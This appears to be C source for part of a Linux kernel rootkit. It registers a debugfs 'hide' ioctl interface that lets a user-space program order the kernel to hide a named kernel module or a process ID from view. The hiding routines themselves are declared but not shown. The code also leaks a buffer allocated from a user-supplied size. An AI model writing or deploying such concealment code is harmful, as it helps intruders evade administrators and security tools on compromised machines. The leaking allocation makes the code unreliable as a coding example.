#include <linux/debugfs.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#include "ioctl.h"

void hide_module(char* module);
void hide_process(int pid);

static struct dentry* dir;

/*
 * function responsible for handling ioctl calls for /sys/.../hide/ioctl
 */
long hide_ioctl(struct file* f, unsigned int cmd, unsigned long argp)
{
	void __user *arg_user;
	char *buffer;
	arg_user = (void __user*) argp;

	module_t mod_info;
	int proc_pid;

	pr_info("cmd = %x\n", cmd);

	switch(cmd) {
		case HIDE_MODULE:
		
			pr_err("module option\n");
			if (copy_from_user(&mod_info, arg_user, sizeof(module_t))){ 
				return -EFAULT; 
			}	
			buffer = kmalloc(mod_info.size, GFP_KERNEL);
			pr_err("hide module\n");
			hide_module(mod_info.name);
		break;

		case HIDE_PROCESS:

			if(copy_from_user(&proc_pid, arg_user, sizeof(int))){
				return -EFAULT;
			}

			pr_err("process pid: %d\n", proc_pid);
			hide_process(proc_pid);
		break;
		
		default:
			return -EINVAL;
		break;
	}

	return 0;
	
}

int hide_open(struct inode *in, struct file *f)
{
	return 0;
}

static const struct file_operations ioctl_fops = {
	.owner = THIS_MODULE,
	.open = hide_open,
	.unlocked_ioctl = hide_ioctl,
};

void init_ioctls(void){

	dir = debugfs_create_dir("hide", 0);
	debugfs_create_file("ioctl", 0, dir, NULL, &ioctl_fops);
}

void release_ioctls(void){
	debugfs_remove_recursive(dir);
}


